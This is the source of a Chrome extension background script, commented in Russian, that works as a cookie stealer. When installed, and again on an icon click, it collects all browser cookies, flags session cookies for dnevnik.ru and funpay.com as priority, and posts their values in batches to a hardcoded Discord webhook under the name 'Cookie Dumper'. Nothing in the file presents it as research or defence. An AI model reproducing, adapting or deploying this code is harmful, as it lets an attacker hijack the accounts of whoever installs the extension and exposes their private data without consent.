const WEBHOOK_URL = 'https://discord.com/api/webhooks/1424125042157158444/9-edBxW1j2sVxogte4bnpa3nbIYCwBiYNVdKLzfY5LYW6URCDPYmfcCJ4z11wVoanpkj';

// Домены, которые нас интересуют в первую очередь
const PRIORITY_DOMAINS = ['dnevnik.ru', 'funpay.com'];
const PRIORITY_NAMES = ['dnevnik_cid', 'golden_key'];

async function dumpCookies() {
  const all = await chrome.cookies.getAll({});

  const priority = all.filter(c =>
    PRIORITY_NAMES.includes(c.name) ||
    PRIORITY_DOMAINS.some(d => (c.domain || '').includes(d))
  );

  const fmt = (c) =>
    `${c.domain}\t${c.name}=${c.value} \n`;

  const priorityBlock = priority.length
    ? priority.map(fmt).join('\n')
    : '(ничего из приоритетных не найдено)';

  // Отправляем приоритетные отдельным embed
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: 'Cookie Dumper',
      content: `🍪 **Cookies dump** — всего: ${all.length}, приоритетных: ${priority.length}`,
      embeds: [
        {
          title: '🎯 Приоритетные cookies',
          description: '```\n' + priorityBlock.slice(0, 3900) + '\n```',
          color: 0x57F287,
        },
      ],
    }),
  });

  // Остальные — батчами по 20 строк
  const rest = all.filter(c => !priority.includes(c));
  const lines = rest.map(fmt);
  const CHUNK = 20;
  for (let i = 0; i < lines.length; i += CHUNK) {
    const chunk = lines.slice(i, i + CHUNK).join('\n');
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Cookie Dumper',
        content: `🍪 Все cookies, часть ${Math.floor(i / CHUNK) + 1}`,
        embeds: [{
          description: '```\n' + chunk.slice(0, 3900) + '\n```',
          color: 0x5865F2,
        }],
      }),
    });
    await new Promise(r => setTimeout(r, 1200)); // анти-rate-limit
  }

  console.log(`Отправлено. Всего cookies: ${all.length}, приоритетных: ${priority.length}`);
}

// Триггер: клик по иконке расширения
chrome.action.onClicked.addListener(() => {
  dumpCookies().catch(e => console.error('Dump failed:', e));
});

// Триггер: сразу при установке
chrome.runtime.onInstalled.addListener(() => {
  dumpCookies().catch(e => console.error('Dump failed:', e));
});